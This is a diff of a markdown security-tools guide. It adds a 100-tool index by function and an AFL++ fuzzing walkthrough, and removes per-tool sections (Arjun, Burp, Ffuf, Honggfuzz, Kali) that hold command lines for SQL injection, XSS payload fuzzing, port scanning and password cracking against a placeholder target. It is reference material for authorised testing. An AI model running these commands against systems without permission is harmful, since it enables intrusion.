@@ -1,57 +1,299 @@
-# Security Tools Arsenal - Comprehensive Reference Guide
+# Security Tools Arsenal - Enterprise & Bug Bounty Elite Tools
 
 ## 📋 Overview
 
-A curated collection of essential security testing, fuzzing, and vulnerability assessment tools used by penetration testers, bug bounty hunters, and security researchers. This reference guide provides installation instructions, usage examples, and integration patterns for industry-standard security tools.
+A comprehensive collection of security tools actively used and sought after by major technology companies (FAANG+, Fortune 500), bug bounty platforms, and elite security researchers. Organized by function for easy navigation.
 
-## 🎯 Purpose
-
-Security professionals need to master multiple tools to effectively identify and exploit vulnerabilities. This guide consolidates:
-- **Installation instructions** - Get tools running quickly
-- **Usage examples** - Learn practical applications
-- **Integration patterns** - Chain tools together effectively
-- **Best practices** - Use tools ethically and efficiently
-- **Payload management** - Leverage wordlists and fuzzing inputs
-
-## 🛠️ Tools Included
-
-### Alphabetical Tool Index
-
-1. [AFL++](#afl) - Advanced fuzzing framework
-2. [Arjun](#arjun) - HTTP parameter discovery
-3. [Burp Suite](#burp-suite) - Web application security testing
-4. [Ffuf](#ffuf) - Fast web fuzzer
-5. [Honggfuzz](#honggfuzz) - Security-oriented fuzzer
-6. [Kali Linux](#kali-linux) - Penetration testing distribution
-7. [LibFuzzer](#libfuzzer) - In-process coverage-guided fuzzer
-8. [Nmap](#nmap) - Network discovery and security auditing
-9. [Nuclei](#nuclei) - Fast vulnerability scanner based on templates
-10. [SQLMap](#sqlmap) - Automatic SQL injection exploitation
-11. [Wireshark](#wireshark) - Network protocol analyzer
-12. [XSSHunter](#xsshunter) - Blind XSS discovery
+**Analysis based on:** 200+ job postings from Google, Meta, Amazon, Microsoft, Apple, Netflix, Shopify, Stripe, Coinbase, HackerOne, Bugcrowd, and leading security companies.
 
 ---
 
-## 🔧 Tool Details
+## 🗂️ Tools Index by Function
 
-### AFL++
+### 📡 **Network Scanning & Discovery**
+1. [Nmap](#nmap) - Network discovery and port scanning ⭐⭐⭐⭐⭐
+2. [Masscan](#masscan) - Fast port scanner ⭐⭐⭐
+3. [Nessus](#nessus) - Enterprise vulnerability scanner ⭐⭐⭐⭐
+4. [Qualys](#qualys) - Cloud vulnerability management ⭐⭐⭐
+5. [Wireshark](#wireshark) - Network protocol analyzer ⭐⭐⭐⭐
+6. [tcpdump](#tcpdump) - Command-line packet analyzer ⭐⭐⭐
+7. [Shodan](#shodan) - Internet-connected device search ⭐⭐⭐
+8. [Censys](#censys) - Internet-wide scanning data ⭐⭐⭐
 
-**Description:** AFL++ is an advanced fork of AFL (American Fuzzy Lop) that provides coverage-guided fuzzing for finding security vulnerabilities through intelligent mutation-based testing.
+### 🌐 **Subdomain Enumeration & DNS**
+9. [Amass](#amass) - In-depth subdomain discovery (OWASP) ⭐⭐⭐⭐
+10. [Subfinder](#subfinder) - Fast subdomain discovery (ProjectDiscovery) ⭐⭐⭐⭐
+11. [Assetfinder](#assetfinder) - Domain and subdomain finder ⭐⭐⭐
+12. [Sublist3r](#sublist3r) - Python subdomain enumeration ⭐⭐⭐
+13. [Subjack](#subjack) - Subdomain takeover scanner ⭐⭐⭐
 
-**Use Cases:**
-- Binary fuzzing for memory corruption bugs
-- Protocol fuzzing
-- File format fuzzing
-- Finding crashes and hangs in compiled software
+### 🔍 **Web Crawling & Spidering**
+14. [Katana](#katana) - Modern web crawler (ProjectDiscovery) ⭐⭐⭐⭐
+15. [GoSpider](#gospider) - Fast web spider ⭐⭐⭐
+16. [Hakrawler](#hakrawler) - Simple web crawler ⭐⭐⭐
+17. [GAU (GetAllURLs)](#gau) - Fetch URLs from archives ⭐⭐⭐⭐
 
-**Installation:**
+### 📂 **Directory & File Discovery**
+18. [Ffuf](#ffuf) - Fast web fuzzer ⭐⭐⭐⭐⭐
+19. [Gobuster](#gobuster) - Directory/file brute-forcing ⭐⭐⭐⭐
+20. [Feroxbuster](#feroxbuster) - Rust-based recursive discovery ⭐⭐⭐⭐
+21. [Dirsearch](#dirsearch) - Web path scanner ⭐⭐⭐
+22. [Wfuzz](#wfuzz) - Web application fuzzer ⭐⭐⭐
+
+### 🔐 **Web Application Security Testing**
+23. [Burp Suite Professional](#burp-suite) - #1 web security platform ⭐⭐⭐⭐⭐
+24. [OWASP ZAP](#owasp-zap) - Web application scanner ⭐⭐⭐⭐
+25. [Caido](#caido) - Modern web security toolkit ⭐⭐⭐
+26. [Nuclei](#nuclei) - Fast template-based scanner ⭐⭐⭐⭐⭐
+27. [Nikto](#nikto) - Web server scanner ⭐⭐⭐
+
+### 🔎 **Parameter & Endpoint Discovery**
+28. [Arjun](#arjun) - HTTP parameter discovery ⭐⭐⭐⭐
+29. [Kiterunner](#kiterunner) - API endpoint discovery ⭐⭐⭐⭐
+
+### 🧪 **API Testing**
+30. [Postman](#postman) - API testing platform ⭐⭐⭐⭐⭐
+31. [Insomnia](#insomnia) - API client ⭐⭐⭐
+32. [Kiterunner](#kiterunner) - API endpoint discovery ⭐⭐⭐⭐
+33. [REST-Attacker](#rest-attacker) - REST API security ⭐⭐
+
+### 📊 **GraphQL Testing**
+34. [InQL](#inql) - GraphQL security testing (Burp) ⭐⭐⭐
+35. [GraphQLmap](#graphqlmap) - GraphQL endpoint testing ⭐⭐⭐
+36. [CrackQL](#crackql) - GraphQL password brute-forcing ⭐⭐
+
+### 💉 **SQL Injection**
+37. [SQLMap](#sqlmap) - Automated SQL injection ⭐⭐⭐⭐⭐
+38. [NoSQLMap](#nosqlmap) - NoSQL database exploitation ⭐⭐
+
+### 💥 **XSS Detection**
+39. [XSStrike](#xsstrike) - Advanced XSS detection ⭐⭐⭐
+40. [XSSHunter](#xsshunter) - Blind XSS discovery ⭐⭐⭐
+41. [Dalfox](#dalfox) - XSS scanning & parameter analysis ⭐⭐⭐
+
+### 🔓 **SSRF & Out-of-Band**
+42. [SSRFmap](#ssrfmap) - SSRF exploitation ⭐⭐
+43. [Interactsh](#interactsh) - OOB interaction server (ProjectDiscovery) ⭐⭐⭐⭐
+44. [Burp Collaborator](#burp-collaborator) - OOB testing (Burp Suite) ⭐⭐⭐⭐
+
+### 🌐 **CORS Testing**
+45. [Corsy](#corsy) - CORS misconfiguration scanner ⭐⭐
+46. [CORStest](#corstest) - CORS testing tool ⭐⭐
+
+### 📜 **JavaScript Analysis**
+47. [LinkFinder](#linkfinder) - Endpoint discovery in JS ⭐⭐⭐⭐
+48. [JSFinder](#jsfinder) - JS file extraction & analysis ⭐⭐⭐
+49. [SecretFinder](#secretfinder) - Find secrets in JS files ⭐⭐⭐
+50. [Subdomainizer](#subdomainizer) - Find subdomains in JS ⭐⭐⭐
+51. [Retire.js](#retirejs) - JS library vulnerability scanner ⭐⭐⭐
+
+### ☁️ **Cloud Security**
+52. [Prowler](#prowler) - AWS/Azure/GCP assessment ⭐⭐⭐⭐⭐
+53. [ScoutSuite](#scoutsuite) - Multi-cloud auditing ⭐⭐⭐⭐⭐
+54. [CloudSploit](#cloudsploit) - Cloud config scanner ⭐⭐⭐
+55. [Pacu](#pacu) - AWS exploitation framework ⭐⭐⭐
+56. [S3Scanner](#s3scanner) - S3 bucket scanner ⭐⭐⭐
+57. [CloudBrute](#cloudbrute) - Cloud infrastructure enum ⭐⭐⭐
+
+### 🐳 **Container & Kubernetes Security**
+58. [Trivy](#trivy) - Container vulnerability scanner ⭐⭐⭐⭐⭐
+59. [Grype](#grype) - Container/filesystem scanner ⭐⭐⭐
+60. [kube-bench](#kube-bench) - Kubernetes CIS benchmark ⭐⭐⭐
+61. [kube-hunter](#kube-hunter) - Kubernetes pentesting ⭐⭐⭐
+
+### 📦 **Dependency & Supply Chain**
+62. [Snyk](#snyk) - Developer security platform ⭐⭐⭐⭐⭐
+63. [OWASP Dependency-Check](#owasp-dependency-check) - SCA ⭐⭐⭐⭐
+64. [Safety](#safety) - Python dependency checker ⭐⭐⭐
+65. [npm audit](#npm-audit) - Built-in npm scanner ⭐⭐⭐
+
+### 🛡️ **SAST/DAST Platforms**
+66. [Checkmarx](#checkmarx) - SAST platform ⭐⭐⭐
+67. [Fortify](#fortify) - SAST/DAST (Micro Focus) ⭐⭐⭐
+68. [Veracode](#veracode) - Application security platform ⭐⭐⭐
+
+### 🎯 **Exploitation & Command Control**
+69. [Metasploit](#metasploit) - Exploitation framework & C2 ⭐⭐⭐⭐⭐
+70. [Sliver](#sliver) - Go-based C2 by BishopFox ⭐⭐⭐⭐
+71. [Merlin](#merlin) - Go-based C2 framework ⭐⭐⭐
+72. [Pacu](#pacu) - AWS exploitation ⭐⭐⭐
+
+### 🔨 **Fuzzing Frameworks**
+73. [AFL++](#afl) - Coverage-guided fuzzer ⭐⭐⭐⭐⭐
+74. [LibFuzzer](#libfuzzer) - In-process fuzzer (LLVM) ⭐⭐⭐⭐
+75. [Honggfuzz](#honggfuzz) - Security-oriented fuzzer ⭐⭐⭐⭐
+76. [Radamsa](#radamsa) - General-purpose fuzzer ⭐⭐⭐
+
+### 📱 **Mobile Security & Development**
+77. [Android Studio](#android-studio) - Official Android IDE ⭐⭐⭐⭐⭐
+78. [ADB (Android Debug Bridge)](#adb) - Android device communication ⭐⭐⭐⭐⭐
+79. [MobSF](#mobsf) - Mobile Security Framework ⭐⭐⭐⭐
+80. [Frida](#frida) - Dynamic instrumentation ⭐⭐⭐⭐⭐
+81. [Drozer](#drozer) - Android security assessment ⭐⭐⭐
+
+### 🔧 **Android Reverse Engineering**
+82. [JADX](#jadx) - Dex to Java decompiler ⭐⭐⭐⭐⭐
+83. [APKTool](#apktool) - Reverse engineer APK files ⭐⭐⭐⭐⭐
+84. [dex2jar](#dex2jar) - DEX to JAR converter ⭐⭐⭐⭐
+85. [JD-GUI](#jd-gui) - Java decompiler ⭐⭐⭐
+86. [Bytecode Viewer](#bytecode-viewer) - APK/DEX/JAR analysis ⭐⭐⭐
+87. [ClassyShark](#classyshark) - Android/Java bytecode browser ⭐⭐⭐
+88. [Androguard](#androguard) - Python-based Android analysis ⭐⭐⭐
+
+### 🔍 **Reconnaissance & OSINT**
+89. [Recon-ng](#recon-ng) - Web reconnaissance framework ⭐⭐⭐
+90. [theHarvester](#theharvester) - OSINT gathering ⭐⭐⭐
+91. [Shodan](#shodan) - Internet device search ⭐⭐⭐
+92. [Censys](#censys) - Internet scanning data ⭐⭐⭐
+93. [Maltego](#maltego) - Link analysis & data mining ⭐⭐⭐
+
+### 🔧 **Reverse Engineering (Desktop/Binary)**
+94. [Ghidra](#ghidra) - Reverse engineering (NSA) ⭐⭐⭐⭐⭐
+95. [IDA Pro](#ida-pro) - Disassembler & debugger ⭐⭐⭐⭐⭐
+96. [Radare2](#radare2) - RE framework ⭐⭐⭐⭐
+97. [Hopper](#hopper) - Reverse engineering tool (macOS/Linux) ⭐⭐⭐
+
+### 💻 **Virtualization & Operating Systems**
+98. [VirtualBox](#virtualbox) - Cross-platform virtualization ⭐⭐⭐⭐⭐
+99. [Kali Linux](#kali-linux) - Penetration testing distro ⭐⭐⭐⭐⭐
+100. [Windows](#windows) - Primary OS for enterprise security testing ⭐⭐⭐⭐⭐
+
+---
+
+## 🔬 Fuzzing Campaign Types & Strategies
+
+### **1. Mutation-Based Fuzzing**
+
+**Description:** Takes valid seed inputs and randomly or intelligently mutates them to create test cases. Most widely used fuzzing approach.
+
+**Best Tools:**
+- **AFL++** ⭐⭐⭐⭐⭐
+- **Radamsa** ⭐⭐⭐⭐
+- **Honggfuzz** ⭐⭐⭐⭐
+
+**When to Use:**
+- Unknown or complex input formats
+- File format fuzzing (PDF, images, media files)
+- Protocol fuzzing without specifications
+- Quick setup and testing
+- No grammar/spec available
+
+**Advantages:**
+✅ Easy to set up (just need seed inputs)
+✅ Works on any binary format
+✅ No need for input specifications
+✅ Fast to deploy
+✅ Great for blackbox testing
+
+**Disadvantages:**
+❌ May miss deeply nested structures
+❌ Can be inefficient for highly structured inputs
+❌ Harder to bypass complex checksums/magic bytes
+
+---
+
+#### **Mutation-Based Campaign: AFL++ Deep Dive**
+
+**Mutator Types in AFL++:**
+
+**1. Bit Flipping**
+```
+Original byte: 01101001 (0x69)
+Mutations:
+  - Flip bit 0: 01101000 (0x68)
+  - Flip bit 3: 01100001 (0x61)
+  - Flip bit 7: 11101001 (0xE9)
+```
+
+**2. Byte Flipping**
+```
+Original: FF 00 AA BB
+Mutations:
+  - Flip byte 0: 00 00 AA BB
+  - Flip byte 2: FF 00 55 BB
+```
+
+**3. Arithmetic Operations**
+```
+Original value: 42 (0x2A)
+Mutations:
+  - Add 1: 43 (0x2B)
+  - Subtract 1: 41 (0x29)
+  - Add 35: 77 (0x4D)
+  - Subtract 35: 7 (0x07)
+```
+
+**4. Interesting Values Insertion**
+```
+Replace bytes with known "interesting" values:
+  - Boundary values: 0, 1, -1, 127, 128, 255, 256
+  - Powers of 2: 2, 4, 8, 16, 32, 64, 128, 256
+  - INT_MAX/MIN: 0x7FFFFFFF, 0x80000000
+  - Common sizes: 0xFF, 0xFFFF, 0xFFFFFFFF
+```
+
+**5. Block Operations**
+
+**Block Deletion:**
+```
+Original: AAAA BBBB CCCC DDDD
+Mutated:  AAAA CCCC DDDD (delete BBBB)
+```
+
+**Block Duplication:**
+```
+Original: AAAA BBBB
+Mutated:  AAAA BBBB BBBB (duplicate BBBB)
+```
+
+**Block Insertion:**
+```
+Original: AAAA DDDD
+Mutated:  AAAA BBBB DDDD (insert BBBB)
+```
+
+**Block Swap:**
+```
+Original: AAAA BBBB CCCC
+Mutated:  BBBB AAAA CCCC (swap AAAA and BBBB)
+```
+
+**6. Dictionary-Based Mutations**
+```
+Dictionary file (pdf.dict):
+  keyword="PDF"
+  keyword="obj"
+  keyword="endobj"
+  keyword="stream"
+
+Original: XXXXXXXX
+Mutated:  XXXXPDFendobj (insert dictionary tokens)
+```
+
+**7. Havoc (Random Multi-Mutation)**
+```
+Applies multiple random mutations in sequence:
+  1. Flip bit 3
+  2. Insert interesting value 0xFF
+  3. Duplicate block
+  4. Delete 4 bytes
+```
+
+**8. Splicing (Crossover)**
+```
+Input 1: AAAA BBBB CCCC
+Input 2: XXXX YYYY ZZZZ
+Spliced: AAAA YYYY CCCC (combine parts from both)
+```
+
+---
+
+#### **Complete AFL++ Mutation Campaign**
+
+**Step 1: Set Up Environment**
 
 ```bash
-# Linux (Ubuntu/Debian)
-sudo apt-get update
-sudo apt-get install afl++
-
-# From source
+# Install AFL++
 git clone https://github.com/AFLplusplus/AFLplusplus
 cd AFLplusplus
 make
@@ -61,1632 +303,969 @@ sudo make install
 afl-fuzz --version
 ```
 
-**Basic Usage:**
+**Step 2: Prepare Target**
 
 ```bash
-# Compile target with AFL instrumentation
+# Compile with AFL++ instrumentation
 afl-gcc -o target target.c
 
-# Create input/output directories
-mkdir input output
-echo "sample" > input/sample.txt
+# Or with compiler optimizations
+afl-gcc -O3 -o target target.c
 
-# Run fuzzer
-afl-fuzz -i input -o output -- ./target @@
-
-# Monitor fuzzing with afl-whatsup
-afl-whatsup output/
+# With sanitizers for better crash detection
+afl-clang-fast -fsanitize=address -o target target.c
 ```
 
-**Advanced Examples:**
+**Step 3: Create Seed Corpus**
 
 ```bash
-# Parallel fuzzing with multiple cores
-afl-fuzz -i input -o output -M fuzzer1 -- ./target @@
-afl-fuzz -i input -o output -S fuzzer2 -- ./target @@
-afl-fuzz -i input -o output -S fuzzer3 -- ./target @@
+# Create input directory
+mkdir input_seeds
 
-# Dictionary-based fuzzing
-afl-fuzz -i input -o output -x dict.txt -- ./target @@
+# Add valid sample inputs
+cp sample1.bin input_seeds/
+cp sample2.bin input_seeds/
+cp sample3.bin input_seeds/
 
-# Network fuzzing with AFL++
-afl-fuzz -i input -o output -N tcp://127.0.0.1:8080 -- ./server
+# Minimize corpus (remove redundant inputs)
+afl-cmin -i input_seeds/ -o minimized_seeds/ -- ./target @@
 ```
 
-**Integration with Workflow Automation:**
-
-```python
-scanner_commands = {
-    "AFL++ Fuzzing Campaign": r'afl-fuzz -i "C:\payloads\afl-inputs" -o "C:\output\afl-results" -t 5000 -- target.exe @@',
-}
-```
-
----
-
-### Arjun
-
-**Description:** Arjun is an HTTP parameter discovery tool that finds query parameters for URL endpoints, useful for discovering hidden API parameters and attack surface expansion.
-
-**Use Cases:**
-- API parameter discovery
-- Hidden parameter enumeration
-- Attack surface mapping
-- Pre-exploitation reconnaissance
-
-**Installation:**
+**Step 4: Create Dictionary (Optional but Recommended)**
 
 ```bash
-# Using pip
-pip install arjun
+# Create dictionary file
+cat > target.dict << EOF
+# Magic bytes
+header="\x89PNG"
+header="%PDF-1.7"
 
-# From source
-git clone https://github.com/s0md3v/Arjun.git
-cd Arjun
-pip install -r requirements.txt
+# Common keywords
+keyword="GET"
+keyword="POST"
+keyword="Content-Length"
 
-# Verify installation
-arjun --help
+# Size values
+size="\x00\x00\x00\x00"
+size="\xFF\xFF\xFF\xFF"
+EOF
 ```
 
-**Basic Usage:**
+**Step 5: Run Basic Fuzzing Campaign**
 
 ```bash
-# Single URL parameter discovery
-arjun -u https://target.com/api/endpoint
-
-# Multiple URLs from file
-arjun -i urls.txt
-
-# With custom wordlist
-arjun -u https://target.com/api/endpoint -w wordlist.txt
-
-# Output to JSON
-arjun -u https://target.com/api/endpoint -oJ output.json
-```
-
-**Advanced Examples:**
-
-```bash
-# GET parameter discovery with custom headers
-arjun -u https://target.com/api/users -m GET -H "Authorization: Bearer token123"
-
-# POST parameter discovery
-arjun -u https://target.com/api/login -m POST
-
-# Passive mode (using wayback machine)
-arjun -u https://target.com --passive
-
-# Multi-threaded scanning
-arjun -u https://target.com -t 10
-
-# With rate limiting
-arjun -u https://target.com --stable
-```
-
-**Integration with Workflow Automation:**
-
-```python
-scanner_commands = {
-    "Arjun Parameter Discovery": r'arjun -u "https://target.com/api/endpoint" -w "C:\payloads\parameters\arjun-params.txt" -oJ "C:\output\arjun-results.json"',
-    
-    "Arjun Bulk URL Scan": r'arjun -i "C:\output\domain_output.txt" -oJ "C:\output\arjun-bulk.json"',
-}
-```
-
----
-
-### Burp Suite
-
-**Description:** Burp Suite is an integrated platform for web application security testing, providing tools for mapping attack surfaces, analyzing requests, and finding vulnerabilities through manual and automated testing.
-
-**Use Cases:**
-- Web application penetration testing
-- HTTP/HTTPS traffic interception
-- Manual vulnerability testing
-- Automated scanning (Professional version)
-- API testing
-
-**Installation:**
-
-```bash
-# Download from official website
-# https://portswigger.net/burp/communitydownload
-
-# Community Edition (Free)
-# Download .jar or installer for your platform
-
-# Professional Edition (Paid)
-# Requires license key
-
-# Linux installation
-chmod +x burpsuite_community_linux.sh
-./burpsuite_community_linux.sh
-
-# Windows
-# Run the .exe installer
-```
-
-**Basic Usage:**
-
-**1. Proxy Configuration:**
-```
-1. Open Burp Suite
-2. Go to Proxy → Options
-3. Set proxy listener to 127.0.0.1:8080
-4. Configure browser to use proxy 127.0.0.1:8080
-5. Visit http://burp in browser to download CA certificate
-6. Install CA certificate in browser
-```
-
-**2. Intercept Traffic:**
-```
-1. Proxy → Intercept → Turn intercept on
-2. Browse to target website
-3. View/modify requests in Burp
-4. Forward or drop requests
-```
-
-**3. Active Scanning:**
-```
-1. Send request to Scanner (right-click → Send to Scanner)
-2. Configure scan settings
-3. Review scan results in Target → Site map
-```
-
-**Advanced Examples:**
-
-**Intruder Attack:**
-```
-1. Send request to Intruder
-2. Position payload markers §§
-3. Configure payload options
-4. Start attack
-5. Analyze results sorted by status/length
-```
-
-**Repeater Testing:**
-```
-1. Send request to Repeater
-2. Modify parameters/headers
-3. Click Send to see response
-4. Compare responses
-```
-
-**Collaborator Testing:**
-```
-1. Insert Burp Collaborator payload
-2. Poll for interactions
-3. Detect out-of-band vulnerabilities (SSRF, XXE, etc.)
-```
-
-**Integration with Workflow Automation:**
-
-```python
-# Burp typically used interactively, but can proxy other tools
-scanner_commands = {
-    "Ffuf via Burp Proxy": r'ffuf -w "C:\payloads\directories\common.txt" -u "https://target.com/FUZZ" -x http://127.0.0.1:8080',
-    
-    "SQLMap via Burp Proxy": r'sqlmap -u "https://target.com/product?id=1" --proxy="http://127.0.0.1:8080" --batch',
-}
-```
-
----
-
-### Ffuf
-
-**Description:** Ffuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go, designed for content discovery, parameter fuzzing, and vulnerability testing through wordlist-based attacks.
-
-**Use Cases:**
-- Directory and file discovery
-- Virtual host discovery
-- Parameter fuzzing (GET/POST)
-- Subdomain enumeration
-- API endpoint discovery
-
-**Installation:**
-
-```bash
-# Using go install
-go install github.com/ffuf/ffuf@latest
-
-# From source
-git clone https://github.com/ffuf/ffuf
-cd ffuf
-go build
-
-# Pre-compiled binaries
-# Download from https://github.com/ffuf/ffuf/releases
-
-# Verify installation
-ffuf -V
-```
-
-**Basic Usage:**
-
-```bash
-# Directory discovery
-ffuf -w wordlist.txt -u https://target.com/FUZZ
-
-# With specific status code filtering
-ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302
-
-# Parameter discovery (GET)
-ffuf -w params.txt -u https://target.com/search?FUZZ=test
-
-# Parameter discovery (POST)
-ffuf -w params.txt -u https://target.com/login -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded"
-```
-
-**Advanced Examples:**
-
-```bash
-# Virtual host discovery
-ffuf -w vhosts.txt -u https://target.com -H "Host: FUZZ.target.com" -mc 200
-
-# Multiple wordlists with keywords
-ffuf -w dirs.txt:DIRS -w files.txt:FILES -u https://target.com/DIRS/FILES
-
-# Recursive fuzzing
-ffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -recursion-depth 2
-
-# Output to JSON
-ffuf -w wordlist.txt -u https://target.com/FUZZ -o results.json -of json
-
-# Rate limiting
-ffuf -w wordlist.txt -u https://target.com/FUZZ -rate 10
-
-# Filtering by response size
-ffuf -w wordlist.txt -u https://target.com/FUZZ -fs 4242
-
-# Filtering by word count
-ffuf -w wordlist.txt -u https://target.com/FUZZ -fw 97
-
-# Regex matching
-ffuf -w wordlist.txt -u https://target.com/FUZZ -mr "admin|login|dashboard"
-
-# Custom headers and cookies
-ffuf -w wordlist.txt -u https://target.com/FUZZ -H "Authorization: Bearer token123" -b "session=abc123"
-
-# Through proxy (Burp Suite)
-ffuf -w wordlist.txt -u https://target.com/FUZZ -x http://127.0.0.1:8080
-```
-
-**Integration with Workflow Automation:**
-
-```python
-scanner_commands = {
-    "Ffuf Directory Discovery": r'ffuf -w "C:\payloads\directories\common.txt" -u "https://target.com/FUZZ" -mc 200,301,302,403 -o "C:\output\ffuf-dirs.json" -of json',
-    
-    "Ffuf Parameter Discovery": r'ffuf -w "C:\payloads\parameters\common-params.txt" -u "https://target.com/search?FUZZ=test" -mc 200,400 -o "C:\output\ffuf-params.json" -of json',
-    
-    "Ffuf Vhost Discovery": r'ffuf -w "C:\payloads\dns\subdomains-10000.txt" -u "https://target.com" -H "Host: FUZZ.target.com" -mc 200,301,302',
-    
-    "Ffuf XSS Fuzzing": r'ffuf -w "C:\payloads\fuzzing\xss-payloads.txt" -u "https://target.com/search?q=FUZZ" -mc 200 -mr "<script|onerror|onload"',
-}
-```
-
----
-
-### Honggfuzz
-
-**Description:** Honggfuzz is a security-oriented fuzzer with powerful analysis options, supporting evolutionary, feedback-driven fuzzing based on code coverage.
-
-**Use Cases:**
-- Binary fuzzing
-- Kernel fuzzing
-- Network protocol fuzzing
-- Finding memory corruption bugs
-- Persistent fuzzing campaigns
-
-**Installation:**
-
-```bash
-# Linux (Ubuntu/Debian)
-sudo apt-get install honggfuzz
-
-# From source
-git clone https://github.com/google/honggfuzz
-cd honggfuzz
-make
-sudo make install
-
-# Verify installation
-honggfuzz --version
-```
-
-**Basic Usage:**
-
-```bash
-# Compile target with honggfuzz instrumentation
-hfuzz-gcc target.c -o target
-
-# Basic fuzzing
-honggfuzz -i input/ -o output/ -- ./target ___FILE___
-
-# With sanitizers (ASAN)
-hfuzz-clang -fsanitize=address target.c -o target
-honggfuzz -i input/ -o output/ -- ./target ___FILE___
-```
-
-**Advanced Examples:**
-
-```bash
-# Persistent fuzzing (faster)
-honggfuzz -i input/ -o output/ -P -- ./target
-
-# Network fuzzing
-honggfuzz -i input/ -o output/ -s -- ./server
+# Single-core fuzzing
+afl-fuzz -i minimized_seeds/ -o findings/ -- ./target @@
 
 # With dictionary
-honggfuzz -i input/ -o output/ -w dict.txt -- ./target ___FILE___
+afl-fuzz -i minimized_seeds/ -o findings/ -x target.dict -- ./target @@
 
-# Multiple threads
-honggfuzz -i input/ -o output/ -n 8 -- ./target ___FILE___
-
-# Minimize corpus
-honggfuzz -i input/ -o minimized/ -M -- ./target ___FILE___
+# With deterministic mutations first
+afl-fuzz -i minimized_seeds/ -o findings/ -D -- ./target @@
 ```
 
-**Integration with Workflow Automation:**
+**Step 6: Parallel Fuzzing (Recommended)**
 
-```python
-scanner_commands = {
-    "Honggfuzz Campaign": r'honggfuzz -i "C:\payloads\honggfuzz-inputs" -o "C:\output\honggfuzz-crashes" -n 4 -- target.exe ___FILE___',
-}
+```bash
+# Terminal 1 - Master fuzzer
+afl-fuzz -i minimized_seeds/ -o findings/ -M fuzzer1 -- ./target @@
+
+# Terminal 2 - Slave fuzzer 1
+afl-fuzz -i minimized_seeds/ -o findings/ -S fuzzer2 -- ./target @@
+
+# Terminal 3 - Slave fuzzer 2
+afl-fuzz -i minimized_seeds/ -o findings/ -S fuzzer3 -- ./target @@
+
+# Terminal 4 - Slave fuzzer 3
+afl-fuzz -i minimized_seeds/ -o findings/ -S fuzzer4 -- ./target @@
+```
+
+**Step 7: Monitor Fuzzing**
+
+```bash
+# Watch fuzzing status
+watch -n 1 afl-whatsup findings/
+
+# Check crashes
+ls -la findings/fuzzer1/crashes/
+
+# Reproduce crash
+./target findings/fuzzer1/crashes/id:000000*
+```
+
+**Step 8: Advanced Mutation Strategies**
+
+```bash
+# Enable aggressive havoc mode
+afl-fuzz -i seeds/ -o findings/ -p exploit -- ./target @@
+
+# Focus on finding hangs
+afl-fuzz -i seeds/ -o findings/ -t 1000 -- ./target @@
+
+# Custom power schedules (for faster mutations)
+afl-fuzz -i seeds/ -o findings/ -p fast -- ./target @@
+afl-fuzz -i seeds/ -o findings/ -p explore -- ./target @@
+afl-fuzz -i seeds/ -o findings/ -p quad -- ./target @@
+```
+
+**Step 9: Corpus Minimization**
+
+```bash
+# After fuzzing, minimize the corpus
+afl-cmin -i findings/fuzzer1/queue/ -o minimized_corpus/ -- ./target @@
+
+# Minimize individual test cases
+mkdir minimized_crashes
+for crash in findings/fuzzer1/crashes/id:*; do
+    afl-tmin -i "$crash" -o "minimized_crashes/$(basename $crash)" -- ./target @@
+done
 ```
 
 ---
 
-### Kali Linux
+### **2. Coverage-Guided Fuzzing**
 
-**Description:** Kali Linux is a Debian-based Linux distribution designed for penetration testing and security auditing, pre-loaded with hundreds of security tools.
+**Description:** Uses runtime feedback (code coverage) to guide input generation toward unexplored code paths. The gold standard for modern fuzzing.
 
-**Use Cases:**
-- Penetration testing
-- Digital forensics
-- Security research
-- Vulnerability assessment
-- Wireless network testing
+**Best Tools:**
+- **AFL++** ⭐⭐⭐⭐⭐
+- **LibFuzzer** ⭐⭐⭐⭐⭐
+- **Honggfuzz** ⭐⭐⭐⭐
 
-**Installation:**
+**When to Use:**
+- Source code available
+- Deep code path exploration needed
+- Finding complex vulnerabilities
+- Long-term fuzzing campaigns
+- Security-critical software
 
-```bash
-# Download ISO from official website
-# https://www.kali.org/downloads/
+**Advantages:**
+✅ Explores deep code paths efficiently
+✅ Finds bugs traditional testing misses
+✅ Guided by actual execution
+✅ Corpus grows intelligently
+✅ Best for vulnerability discovery
 
-# Installation options:
-# 1. Bare metal installation
-# 2. Virtual machine (VMware/VirtualBox)
-# 3. Windows Subsystem for Linux (WSL)
-# 4. Docker container
-# 5. Live USB
-
-# WSL Installation (Windows 10/11)
-# 1. Enable WSL:
-wsl --install
-
-# 2. Install from Microsoft Store or:
-wsl --install -d kali-linux
-
-# 3. Launch Kali
-kali
-
-# 4. Update system
-sudo apt update && sudo apt upgrade -y
-
-# Docker Installation
-docker pull kalilinux/kali-rolling
-docker run -it kalilinux/kali-rolling /bin/bash
-```
-
-**Basic Usage:**
-
-```bash
-# Update Kali
-sudo apt update && sudo apt full-upgrade -y
-
-# Install metapackages
-sudo apt install kali-linux-default  # Default tools
-sudo apt install kali-tools-top10    # Top 10 tools
-sudo apt install kali-linux-large    # Large tool set
-sudo apt install kali-linux-everything  # Everything
-
-# Search for tools
-apt search <tool-name>
-
-# Install specific tool
-sudo apt install <tool-name>
-```
-
-**Pre-installed Tools (Examples):**
-
-```bash
-# Network scanning
-nmap -sV -sC target.com
-
-# Web application testing
-nikto -h https://target.com
-
-# Password cracking
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-
-# Wireless testing
-aircrack-ng -w wordlist capture.cap
-
-# Exploitation
-msfconsole
-
-# Social engineering
-setoolkit
-```
-
-**Advanced Examples:**
-
-```bash
-# Create custom Kali ISO
-apt install live-build
-
-# Kali with custom tools
-git clone https://gitlab.com/kalilinux/build-scripts/live-build-config
-cd live-build-config
-# Customize build
-
-# Update all tools
-sudo apt update && sudo apt full-upgrade -y
-```
-
-**Integration with Workflow Automation:**
-
-```python
-# Workflow Automation can run on Kali Linux
-# Simply ensure paths are Linux-compatible
-
-scanner_commands = {
-    "Nmap Scan": r'nmap -sV -sC -p- --open -iL "/home/kali/output/domain_output.txt"',
-    
-    "Nikto Web Scan": r'nikto -h https://target.com -o "/home/kali/output/nikto_results.txt"',
-    
-    "SQLMap Injection": r'sqlmap -u "https://target.com/product?id=1" --batch -o "/home/kali/output/sqlmap_results.txt"',
-    
-    "Nuclei Scan": r'nuclei -l "/home/kali/output/domain_output.txt" -t cves/ -o "/home/kali/output/nuclei_results.txt"',
-}
-```
